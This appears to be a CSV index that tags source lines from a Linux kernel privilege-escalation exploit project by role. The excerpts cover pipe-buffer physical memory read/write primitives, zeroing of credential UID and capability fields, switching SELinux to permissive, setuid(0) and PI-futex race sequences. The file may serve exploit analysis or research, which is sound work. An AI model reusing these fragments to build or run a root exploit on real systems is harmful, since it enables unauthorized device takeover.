path,line,category,excerpt
src/core/fops.c,589,kernel_memory_primitive,"if (configfs_read_once(fd, misc_fops, &after_fail, sizeof(after_fail)) =="
src/core/fops.c,595,kernel_memory_primitive,cfi_owner_ret = configfs_write_once(
src/core/kernelsnitch/kernelsnitch.h,15,build_target,#include <pthread.h>
src/core/kernelsnitch/kernelsnitch.h,92,build_target,pthread_t *tids;
src/core/kernelsnitch/kernelsnitch.h,116,orchestration,"SYSCHK(__futex((unsigned int *)&ks->inc_futex[id], FUTEX_WAIT_PRIVATE, 0, NULL, NULL, 0));"
src/core/kernelsnitch/kernelsnitch.h,123,build_target,pthread_t tid;
src/core/kernelsnitch/kernelsnitch.h,128,build_target,"SYSCHK(pthread_create(&tid, 0, __do_increase, (void *)inc_arg));"
src/core/kernelsnitch/kernelsnitch.h,128,orchestration,"SYSCHK(pthread_create(&tid, 0, __do_increase, (void *)inc_arg));"
src/core/kernelsnitch/kernelsnitch.h,150,orchestration,"SYSCHK(__futex((unsigned int *)futex_addr, FUTEX_WAKE_PRIVATE, 0, NULL, NULL, 0));"
src/core/kernelsnitch/kernelsnitch.h,219,orchestration,"struct kernelsnitch_shared_state *ks = SYSCHK(mmap(0, sizeof(struct kernelsnitch_shared_state), PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));"
src/core/kernelsnitch/kernelsnitch.h,231,orchestration,"ks->times = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*ks->total_futexes, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));"
src/core/kernelsnitch/kernelsnitch.h,232,build_target,"ks->tids = (pthread_t *)SYSCHK(mmap(0, sizeof(pthread_t)*ks->thread_cnt, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));"
src/core/kernelsnitch/kernelsnitch.h,232,orchestration,"ks->tids = (pthread_t *)SYSCHK(mmap(0, sizeof(pthread_t)*ks->thread_cnt, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));"
src/core/kernelsnitch/kernelsnitch.h,233,orchestration,"ks->futexes = SYSCHK(mmap(0, FUTEX_SZ, PROT_NONE, MAP_ANON|MAP_PRIVATE|MAP_NORESERVE, -1, 0));"
src/core/kernelsnitch/kernelsnitch.h,235,orchestration,"SYSCHK(mmap((void *)((size_t)ks->futexes + addr), FUTEX_MMAP_SZ, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED|MAP_FIXED, -1, 0));"
src/core/kernelsnitch/kernelsnitch.h,238,orchestration,"ks->futex_addrs = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*(ks->collisions + 1), PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));"
src/core/kernelsnitch/kernelsnitch.h,317,build_target,"SYSCHK(pthread_create(&ks->tids[i], 0, __mm_leak, mm_leak_arg));"
src/core/kernelsnitch/kernelsnitch.h,317,orchestration,"SYSCHK(pthread_create(&ks->tids[i], 0, __mm_leak, mm_leak_arg));"
src/core/kernelsnitch/kernelsnitch.h,320,build_target,"pthread_join(ks->tids[i], 0);"
src/core/kernelsnitch/kernelsnitch.h,329,build_target,"munmap((void *)ks->tids, sizeof(pthread_t)*ks->thread_cnt);"
src/core/pipe_physrw.c,2,target_specific_layout,"#include ""runtime_struct_offsets.h"""
src/core/pipe_physrw.c,18,kernel_memory_primitive,int physrw_read_ok;
src/core/pipe_physrw.c,19,kernel_memory_primitive,int physrw_write_ok;
src/core/pipe_physrw.c,20,kernel_memory_primitive,int physrw_read64_ok;
src/core/pipe_physrw.c,21,kernel_memory_primitive,int physrw_write64_ok;
src/core/pipe_physrw.c,37,kernel_memory_primitive,char physrw_readback[64];
src/core/pipe_physrw.c,38,kernel_memory_primitive,char physrw_after_write[64];
src/core/pipe_physrw.c,39,orchestration,int pipe_scan_vmemmap;
src/core/pipe_physrw.c,56,kernel_memory_primitive,uint64_t physrw_read64_before;
src/core/pipe_physrw.c,57,kernel_memory_primitive,uint64_t physrw_read64_after;
src/core/pipe_physrw.c,58,kernel_memory_primitive,uint64_t physrw_write64_value;
src/core/pipe_physrw.c,61,target_specific_layout,uint64_t off = (active_offsets && active_offsets->off_anon_pipe_buf_ops)
src/core/pipe_physrw.c,62,target_specific_layout,? active_offsets->off_anon_pipe_buf_ops : ANON_PIPE_BUF_OPS_OFF;
src/core/pipe_physrw.c,67,target_specific_layout,uint64_t off = (active_offsets && active_offsets->off_kmalloc_caches)
src/core/pipe_physrw.c,68,target_specific_layout,? active_offsets->off_kmalloc_caches : KMALLOC_CACHES_OFF;
src/core/pipe_physrw.c,85,kernel_memory_primitive,"kernel_read64(fd, page + STRUCT_PAGE_COMPOUND_HEAD_OFF);"
src/core/pipe_physrw.c,85,target_specific_layout,"kernel_read64(fd, page + STRUCT_PAGE_COMPOUND_HEAD_OFF);"
src/core/pipe_physrw.c,132,kernel_memory_primitive,"kernel_read_data(fd, pr_kmalloc_caches(), cache_slots, sizeof(cache_slots));"
src/core/pipe_physrw.c,149,kernel_memory_primitive,"pr_info(""physrw cache gate normal_2k=%016llx cgroup_2k=%016llx\n"","
src/core/pipe_physrw.c,156,kernel_memory_primitive,"uint64_t slab_cache = kernel_read64(fd, head + STRUCT_SLAB_CACHE_OFF);"
src/core/pipe_physrw.c,156,target_specific_layout,"uint64_t slab_cache = kernel_read64(fd, head + STRUCT_SLAB_CACHE_OFF);"
src/core/pipe_physrw.c,169,kernel_memory_primitive,"pr_info(""physrw cache gate OK idx=%zu slab=%016llx\n"","
src/core/pipe_physrw.c,189,orchestration,pipe_scan_vmemmap = 0;
src/core/pipe_physrw.c,202,kernel_memory_primitive,"if (kernel_read_data(fd, base + off, slab + off, PHYSRW_SCAN_CHUNK) !="
src/core/pipe_physrw.c,224,orchestration,pipe_scan_vmemmap++;
src/core/pipe_physrw.c,240,target_specific_layout,if (pb.offset != 0 || pb.ops != expected_ops ||
src/core/pipe_physrw.c,262,kernel_memory_primitive,"int pipe_phys_read_data(int fd, uintptr_t direct_addr,"
src/core/pipe_physrw.c,273,kernel_memory_primitive,"if (kernel_read_data(fd, pr_buf_addr, &saved, sizeof(saved)) !="
src/core/pipe_physrw.c,280,target_specific_layout,pb.offset = direct_addr & (PAGE_SIZE - 1);
src/core/pipe_physrw.c,286,kernel_memory_primitive,"if (kernel_write_data(fd, pr_buf_addr, &pb, sizeof(pb)) !="
src/core/pipe_physrw.c,294,kernel_memory_primitive,"kernel_write_data(fd, pr_buf_addr, &saved, sizeof(saved));"
src/core/pipe_physrw.c,298,kernel_memory_primitive,"int pipe_phys_write_data(int fd, uintptr_t direct_addr,"
src/core/pipe_physrw.c,309,kernel_memory_primitive,"if (kernel_read_data(fd, pr_buf_addr, &saved, sizeof(saved)) !="
src/core/pipe_physrw.c,316,target_specific_layout,pb.offset = direct_addr & (PAGE_SIZE - 1);
src/core/pipe_physrw.c,322,kernel_memory_primitive,"if (kernel_write_data(fd, pr_buf_addr, &pb, sizeof(pb)) !="
src/core/pipe_physrw.c,330,kernel_memory_primitive,"kernel_write_data(fd, pr_buf_addr, &saved, sizeof(saved));"
src/core/pipe_physrw.c,336,kernel_memory_primitive,"pipe_phys_read_data(fd, direct_addr, &value, sizeof(value));"
src/core/pipe_physrw.c,342,kernel_memory_primitive,"pipe_phys_read_data(fd, direct_addr, &value, sizeof(value));"
src/core/pipe_physrw.c,347,kernel_memory_primitive,"return pipe_phys_write_data(fd, direct_addr, &value, sizeof(value));"
src/core/pipe_physrw.c,376,orchestration,pipe_scan_vmemmap = 0;
src/core/pipe_physrw.c,387,kernel_memory_primitive,int install_pipe_physrw(int configfs_fd) {
src/core/pipe_physrw.c,391,kernel_memory_primitive,if (!pr_cache_gate(configfs_fd)) {
src/core/pipe_physrw.c,392,kernel_memory_primitive,"pr_info(""physrw cache gate FAILED candidate=%016llx want=%016llx\n"","
src/core/pipe_physrw.c,404,kernel_memory_primitive,"int found = pr_find_buffer(configfs_fd, pr_buf_base);"
src/core/pipe_physrw.c,405,kernel_memory_primitive,"pr_info(""physrw probe found=%d buf=%016zx idx=%d scan=%d/%d/%d\n"","
src/core/pipe_physrw.c,407,orchestration,"pipe_scan_vmemmap, pipe_scan_ops, pipe_scan_len);"
src/core/pipe_physrw.c,416,kernel_memory_primitive,"pr_info(""physrw vmemmap roundtrip FAILED\n"");"
src/core/pipe_physrw.c,416,orchestration,"pr_info(""physrw vmemmap roundtrip FAILED\n"");"
src/core/pipe_physrw.c,420,kernel_memory_primitive,"char seed[] = ""ghostlock_physrw_read"";"
src/core/pipe_physrw.c,421,kernel_memory_primitive,"if (kernel_write_data(configfs_fd, proof_addr, seed, sizeof(seed)) !="
src/core/pipe_physrw.c,426,kernel_memory_primitive,"memset(physrw_readback, 0, sizeof(physrw_readback));"
src/core/pipe_physrw.c,427,kernel_memory_primitive,physrw_read_ok =
src/core/pipe_physrw.c,428,kernel_memory_primitive,"pipe_phys_read_data(configfs_fd, proof_addr,"
src/core/pipe_physrw.c,429,kernel_memory_primitive,"physrw_readback, sizeof(seed));"
src/core/pipe_physrw.c,430,kernel_memory_primitive,"pr_info(""physrw read verify ok=%d idx=%d\n"","
src/core/pipe_physrw.c,431,kernel_memory_primitive,"physrw_read_ok, pr_pipe_idx);"
src/core/pipe_physrw.c,433,kernel_memory_primitive,"char overwrite[] = ""ghostlock_physrw_write"";"
src/core/pipe_physrw.c,434,kernel_memory_primitive,physrw_write_ok =
src/core/pipe_physrw.c,435,kernel_memory_primitive,"pipe_phys_write_data(configfs_fd, proof_addr,"
src/core/pipe_physrw.c,437,kernel_memory_primitive,"pr_info(""physrw write verify ok=%d\n"", physrw_write_ok);"
src/core/pipe_physrw.c,438,kernel_memory_primitive,"kernel_read_data(configfs_fd, proof_addr,"
src/core/pipe_physrw.c,439,kernel_memory_primitive,"physrw_after_write, sizeof(overwrite));"
src/core/pipe_physrw.c,444,kernel_memory_primitive,"kernel_write_data(configfs_fd, proof64_addr, &seed64, sizeof(seed64));"
src/core/pipe_physrw.c,445,kernel_memory_primitive,"physrw_read64_before = pipe_read64(configfs_fd, proof64_addr);"
src/core/pipe_physrw.c,446,kernel_memory_primitive,physrw_read64_ok = physrw_read64_before == seed64;
src/core/pipe_physrw.c,447,kernel_memory_primitive,"pr_info(""physrw read64 ok=%d value=%016llx\n"","
src/core/pipe_physrw.c,448,kernel_memory_primitive,"physrw_read64_ok, (unsigned long long)physrw_read64_before);"
src/core/pipe_physrw.c,450,kernel_memory_primitive,physrw_write64_value = next64;
src/core/pipe_physrw.c,451,kernel_memory_primitive,"physrw_write64_ok = pipe_write64(configfs_fd, proof64_addr, next64);"
src/core/pipe_physrw.c,452,kernel_memory_primitive,"kernel_read_data(configfs_fd, proof64_addr,"
src/core/pipe_physrw.c,453,kernel_memory_primitive,"&physrw_read64_after, sizeof(physrw_read64_after));"
src/core/pipe_physrw.c,454,kernel_memory_primitive,physrw_write64_ok =
src/core/pipe_physrw.c,455,kernel_memory_primitive,physrw_write64_ok && physrw_read64_after == physrw_write64_value;
src/core/pipe_physrw.c,458,kernel_memory_primitive,physrw_read_ok &&
src/core/pipe_physrw.c,459,kernel_memory_primitive,"memcmp(physrw_readback, seed, sizeof(seed)) == 0 &&"
src/core/pipe_physrw.c,460,kernel_memory_primitive,physrw_write_ok &&
src/core/pipe_physrw.c,461,kernel_memory_primitive,"memcmp(physrw_after_write, overwrite, sizeof(overwrite)) == 0 &&"
src/core/pipe_physrw.c,462,kernel_memory_primitive,physrw_read64_ok && physrw_write64_ok;
src/core/pipe_physrw.c,465,kernel_memory_primitive,"pr_info(""physrw installed OK buf=%016zx pipe=%d\n"","
src/core/root.c,2,target_specific_layout,"#include ""runtime_struct_offsets.h"""
src/core/root.c,7,credential_or_execution_transition,uint32_t root_uid_before = 0xffffffff;
src/core/root.c,8,credential_or_execution_transition,uint32_t root_uid_after = 0xffffffff;
src/core/root.c,14,credential_or_execution_transition,int setuid_ret = -1;
src/core/root.c,43,orchestration,"root_shared = SYSCHK(mmap(NULL, sizeof(*root_shared), prot, flags, -1, 0));"
src/core/root.c,72,credential_or_execution_transition,report.setuid_ret = setuid(0);
src/core/root.c,73,credential_or_execution_transition,report.setuid_errno = errno;
src/core/root.c,89,credential_or_execution_transition,if (report.setgid_ret == 0 && report.setuid_ret == 0) {
src/core/root.c,131,credential_or_execution_transition,root_uid_after = report.uid_after;
src/core/root.c,133,credential_or_execution_transition,setuid_ret = report.setuid_ret;
src/core/root.c,167,kernel_memory_primitive,"pipe_phys_read_data(fd, task + TASK_COMM_OFF, comm, TASK_COMM_LEN);"
src/core/root.c,188,kernel_memory_primitive,"if (!pipe_phys_write_data(fd, cred + CRED_UID_OFF, zero_ids, sizeof(zero_ids))) {"
src/core/root.c,193,kernel_memory_primitive,if (!pipe_phys_write_data(
src/core/root.c,201,kernel_memory_primitive,"if (!pipe_phys_write_data(fd, cred + CRED_CAPS_OFF, caps, sizeof(caps))) {"
src/core/root.c,206,kernel_memory_primitive,if (!pipe_phys_read_data(
src/core/root.c,235,kernel_memory_primitive,"return pipe_phys_write_data(fd, osid_addr, sid_pair, sizeof(sid_pair));"
src/core/root.c,270,kernel_memory_primitive,ok &= pipe_phys_write_data(
src/core/root.c,272,kernel_memory_primitive,ok &= pipe_phys_write_data(
src/core/root.c,274,kernel_memory_primitive,ok &= pipe_phys_write_data(
src/core/root.c,300,credential_or_execution_transition,root_uid_before = getuid();
src/core/root.c,307,kernel_memory_primitive,"pipe_phys_read_data(fd, selinux_addr, &selinux_before, sizeof(selinux_before));"
src/core/root.c,329,kernel_memory_primitive,pipe_phys_read_data(
src/core/root.c,360,kernel_memory_primitive,pipe_phys_read_data(
src/core/root.c,363,kernel_memory_primitive,pipe_phys_read_data(
src/core/root.c,389,kernel_memory_primitive,pipe_phys_read_data(
src/core/root.c,392,kernel_memory_primitive,pipe_phys_read_data(
src/core/root.c,420,kernel_memory_primitive,"pipe_phys_write_data(fd, selinux_addr, &permissive, sizeof(permissive));"
src/core/root.c,422,kernel_memory_primitive,"pipe_phys_read_data(fd, selinux_addr, &selinux_mid, sizeof(selinux_mid));"
src/core/root.c,434,kernel_memory_primitive,"pipe_phys_read_data(fd, selinux_addr, &selinux_after, sizeof(selinux_after));"
src/core/root.c,435,credential_or_execution_transition,"pr_info(""root child result done=%d uid_after=%u setgid=%d/%d setuid=%d/%d """
src/core/root.c,438,credential_or_execution_transition,"root_child_done, root_uid_after, report.setgid_ret,"
src/core/root.c,439,credential_or_execution_transition,"report.setgid_errno, report.setuid_ret, report.setuid_errno,"
src/core/slide.c,3,target_specific_layout,#define SLIDE_MAX_ATTEMPTS 20
src/core/slide.c,4,target_specific_layout,#define SLIDE_CONSUME_DELAY 2000
src/core/slide.c,5,target_specific_layout,#define SLIDE_CONSUME_USEC 0
src/core/slide.c,6,target_specific_layout,#ifndef SLIDE_PSELECT_NFDS
src/core/slide.c,7,target_specific_layout,#define SLIDE_PSELECT_NFDS PSELECT_ROUTE_NFDS
src/core/slide.c,9,target_specific_layout,#define SLIDE_PSELECT_PAD_BYTES 0
src/core/slide.c,10,target_specific_layout,#ifndef SLIDE_PSELECT_WORD_SHIFT
src/core/slide.c,11,target_specific_layout,#define SLIDE_PSELECT_WORD_SHIFT 0
src/core/slide.c,13,target_specific_layout,#ifndef SLIDE_WAIT_SECONDS
src/core/slide.c,14,target_specific_layout,#define SLIDE_WAIT_SECONDS 30
src/core/slide.c,35,orchestration,int slide_pselect_words_per_set(void) {
src/core/slide.c,37,target_specific_layout,return (SLIDE_PSELECT_NFDS + bits_per_word - 1) / bits_per_word;
src/core/slide.c,40,orchestration,int slide_pselect_global_word(int waiter_word) {
src/core/slide.c,41,target_specific_layout,return SLIDE_PSELECT_WORD_SHIFT + waiter_word;
src/core/slide.c,44,orchestration,int slide_pselect_put_global_word(
src/core/slide.c,68,orchestration,uint64_t slide_pselect_get_global_word(
src/core/slide.c,89,orchestration,void slide_pselect_put_waiter_word(
src/core/slide.c,92,orchestration,int global_word = slide_pselect_global_word(waiter_word);
src/core/slide.c,93,orchestration,int placed = slide_pselect_put_global_word(
src/core/slide.c,96,orchestration,"pr_warning(""slide pselect cannot place %s waiter_word=%d global_word=%d """
src/core/slide.c,99,target_specific_layout,SLIDE_PSELECT_NFDS);
src/core/slide.c,103,orchestration,"void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {"
src/core/slide.c,108,orchestration,int words_per_set = slide_pselect_words_per_set();
src/core/slide.c,114,target_specific_layout,"{0, SLIDE_LOGGERS_0_1, ""tree_pc""},"
src/core/slide.c,116,target_specific_layout,"{2, SLIDE_RANDOM_BOOT_ID_DATA, ""tree_left""},"
src/core/slide.c,118,target_specific_layout,"{5, SLIDE_LOGGERS_0_1, ""pi0""},"
src/core/slide.c,120,target_specific_layout,"{7, SLIDE_RANDOM_BOOT_ID_DATA, ""pi2""},"
src/core/slide.c,123,target_specific_layout,"{10, SLIDE_INIT_TASK, ""task""},"
src/core/slide.c,130,orchestration,slide_pselect_put_waiter_word(
src/core/slide.c,136,target_specific_layout,for (int fd = 0; fd < SLIDE_PSELECT_NFDS; fd++) {
src/core/slide.c,141,target_specific_layout,"dup2(read_fd, SLIDE_PSELECT_NFDS - 1);"
src/core/slide.c,142,target_specific_layout,"FD_SET(SLIDE_PSELECT_NFDS - 1, ex);"
src/core/slide.c,145,orchestration,void slide_pselect_stack_copy(void) {
src/core/slide.c,147,orchestration,"pr_error(""slide pselect missing kernel page base=%016zx lock=%016zx w0=%016zx\n"","
src/core/slide.c,154,orchestration,"int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);"
src/core/slide.c,156,orchestration,"pr_warning(""slide timerfd_create failed errno=%d; using pipe read end\n"","
src/core/slide.c,160,target_specific_layout,"int high_read = fcntl(block_fd, F_DUPFD, SLIDE_PSELECT_NFDS + 16);"
src/core/slide.c,162,orchestration,"pr_error(""slide pselect F_DUPFD read errno=%d\n"", errno);"
src/core/slide.c,174,orchestration,"prepare_slide_pselect_fdsets(&in, &out, &ex);"
src/core/slide.c,190,target_specific_layout,#ifndef SLIDE_PSELECT_TIMEOUT_SEC
src/core/slide.c,191,target_specific_layout,#define SLIDE_PSELECT_TIMEOUT_SEC PSELECT_TIMEOUT_SEC
src/core/slide.c,193,target_specific_layout,#ifdef SLIDE_USE_SELECT
src/core/slide.c,194,target_specific_layout,"struct timeval tv = { .tv_sec = SLIDE_PSELECT_TIMEOUT_SEC, .tv_usec = 0 };"
src/core/slide.c,195,target_specific_layout,"int ret = select(SLIDE_PSELECT_NFDS, &in, &out, &ex, &tv);"
src/core/slide.c,198,target_specific_layout,".tv_sec = SLIDE_PSELECT_TIMEOUT_SEC,"
src/core/slide.c,202,orchestration,"int ret = pselect(SLIDE_PSELECT_NFDS, &in, &out, &ex, timeoutp, NULL);"
src/core/slide.c,202,target_specific_layout,"int ret = pselect(SLIDE_PSELECT_NFDS, &in, &out, &ex, timeoutp, NULL);"
src/core/slide.c,206,orchestration,"pr_info(""slide pselect returned ret=%d errno=%d calls=%d sched_ok=%d """
src/core/slide.c,238,target_specific_layout,if (SLIDE_CONSUME_USEC) {
src/core/slide.c,239,target_specific_layout,usleep(SLIDE_CONSUME_USEC);
src/core/slide.c,241,target_specific_layout,for (int spin = 0; spin < SLIDE_CONSUME_DELAY; spin++) {
src/core/slide.c,282,pi_futex_sequence,"if (futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {"
src/core/slide.c,294,target_specific_layout,timeout.tv_sec += SLIDE_WAIT_SECONDS;
src/core/slide.c,297,pi_futex_sequence,"futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,"
src/core/slide.c,299,pi_futex_sequence,"futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);"
src/core/slide.c,301,orchestration,slide_pselect_stack_copy();
src/core/slide.c,310,pi_futex_sequence,"if (futex_op(&slide_f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {"
src/core/slide.c,320,pi_futex_sequence,"futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);"
src/core/slide.c,343,target_specific_layout,"int fd = open(""/proc/sys/kernel/random/boot_id"", O_RDONLY | O_CLOEXEC);"
